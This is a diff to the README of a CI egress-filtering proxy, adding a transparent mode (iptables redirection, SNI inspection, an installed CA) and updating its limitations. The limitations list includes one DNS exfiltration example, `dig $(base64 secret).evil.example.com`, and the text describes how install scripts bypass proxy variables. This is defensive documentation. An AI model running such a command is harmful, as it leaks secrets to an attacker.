@@ -42,30 +42,48 @@ request inside it is checked properly.
 one compromised tarball does not — which needs the path, which needs TLS interception. A CA is
 generated in memory per run, written only where the build is told to trust it, and dies with the job.
 
-### What it does not do
+### Two strengths, and which one you are getting
 
-**It cannot filter what refuses to use it.** `HTTPS_PROXY` is a request. npm, pip, curl and git all
-honour it — but a malicious `postinstall` can simply not.
+**Proxy mode** — `exec`, `serve` — points the build at the guard with `HTTPS_PROXY` and friends. A
+variable is a **request**: npm, pip, curl and git all honour it, but a malicious `postinstall` that
+opens its own socket does not, and neither does any runtime with its own opinion. Node's built-in
+fetch ignores the proxy variables entirely unless `NODE_USE_ENV_PROXY` is set — which is how corepack
+was once observed downloading a package manager from a host that was refused one second later.
 
 That matters less than it sounds, because the proxy sits where packages are **fetched**: a blocked
-package is never downloaded, so its install script never runs. The gap is the second case only —
-code already executing that ignores the proxy. Closing it needs default-deny egress, which the
-container can enforce on itself:
+package is never downloaded, so its install script never runs. But it is filtering, not containment,
+and it should not be described to an auditor as containment.
 
-An entrypoint holding `CAP_NET_ADMIN` can put the job's own network namespace in default-deny and
-then **drop privileges before running the build**. The build inherits the namespace, so the rules
-apply to it, but not the capability, so it cannot remove them. Two things decide whether that holds:
+**Transparent mode** — `serve --transparent --redirect --install-ca` — ends the category. The kernel
+redirects outbound 80 and 443 to the guard before anything gets a say, the CA goes into the system
+trust store, and the destination is read from the traffic itself: the TLS `ClientHello`'s SNI, or the
+`Host` header on port 80. There is no variable to ignore and nothing to opt out of. A connection with
+no SNI cannot be identified and is refused — default deny covers "I cannot tell what this is" as well
+as "I know, and no".
 
-- **The capability must be granted from outside** — `--cap-add=NET_ADMIN`, or
-  `securityContext.capabilities`. Nothing inside an image grants it to itself. On GitHub Actions it
-  goes in `container.options`, which allows it — unlike `--network`, one of the two options Actions
-  forbids.
-- **The build must not keep it.** A build running as root with `CAP_NET_ADMIN` just flushes the rules
-  and walks out. The privilege drop *is* the control.
+```
+deter-guard serve --transparent --redirect --install-ca
+```
 
-`deter-guard` does not install those rules yet. Until it does, treat `exec` as strong filtering of
-cooperative tools — which is the whole acquisition half of a supply-chain attack — and not as a
-sandbox.
+Needs Linux and root: `--redirect` writes `iptables` rules and `--install-ca` writes the system trust
+store. GitHub-hosted runners provide passwordless sudo, and the action does this for you with
+`transparent: true`.
+
+Three things worth knowing before you turn it on:
+
+- **The guard exempts its own traffic**, by marking its sockets (`SO_MARK`) rather than by uid — on a
+  CI runner the guard and the build are the *same user*, so uid distinguishes them not at all. Without
+  the exemption the proxy's own upstream connection is redirected back into the proxy, forever.
+- **Your runner's control plane is permitted automatically.** Intercepting *everything* includes the
+  runner's own channel home, and a policy that forgot `github.com` would not merely fail the build —
+  it would stop the runner reporting that it had. The job would die mute. Those hosts are listed at
+  startup, and `--no-ci-hosts` enforces the policy against them too if you would rather have that.
+- **Anything on the machine trusts a CA we minted, for the length of the job.** The CA is generated
+  in memory per run, lasts 24 hours, exists on disk only in the file we install, and is removed on
+  the way out. That is a fair trade on an ephemeral runner and a bad one on a shared workstation.
+
+Node is the exception that still needs a variable: it ships its own roots and ignores the system
+trust store, so `NODE_EXTRA_CA_CERTS` is set even in transparent mode. `deter-guard env` covers it.
 
 ## Quick start
 
@@ -345,6 +363,12 @@ Shape 3 is the one that holds against a process actively trying to get out, and 
 container genuinely has no other route. Do not describe shapes 1 and 2 to your auditors as
 containment.
 
+**Shape 4, and usually the right answer now: add `--transparent --redirect --install-ca`.** It gets
+shape 3's property — nothing can opt out — inside a single container, because the kernel redirects
+the traffic before any process is consulted. It needs Linux and root, which shapes 1 and 2 do not,
+so it is opt-in rather than the default. See
+[Two strengths](#two-strengths-and-which-one-you-are-getting).
+
 ## Exit codes
 
 Distinct on purpose — a pipeline shouldn't have to grep stderr to know what happened.
@@ -404,12 +428,14 @@ Pin `sha-<commit>` in a pipeline if you want an immutable tag.
 
 ## Not here yet
 
-- **Transparent interception.** `exec` and `serve` filter what is *sent* through the proxy; neither
-  stops a process from ignoring `HTTPS_PROXY` and opening its own socket. The sidecar shape above
-  closes that off at the network layer today, but it takes a second container and a shared network
-  namespace. Doing it inside one container means redirecting outbound 80/443 with nftables and
-  reading the SNI off a raw `ClientHello` — the proxy is CONNECT-only right now, so this is real work
-  rather than a flag. See [What it does not do](#what-it-does-not-do).
+- **DNS policy.** Transparent mode redirects TCP 80 and 443, so a build cannot reach a refused host
+  over HTTP — but it can still resolve names, and a resolver is a channel. Nothing stops
+  `dig $(base64 secret).evil.example.com` today.
+- **Ports other than 80 and 443.** A registry on :8443, `git+ssh`, or anything speaking its own
+  protocol goes straight past the redirect. The rules are two lines; knowing what to do with the
+  traffic once it arrives is not.
+- **Certificate pinning.** Anything that pins a certificate breaks under interception by design, and
+  there is no way to filter it and no allowlist for tunnelling it through uninspected yet.
 - **A blocklist feed.** The client already understands and enforces `blocked` entries, and the
   console already serves the field — but nothing populates it yet. Once a feed lands, every job
   picks it up on its next run with no change here.
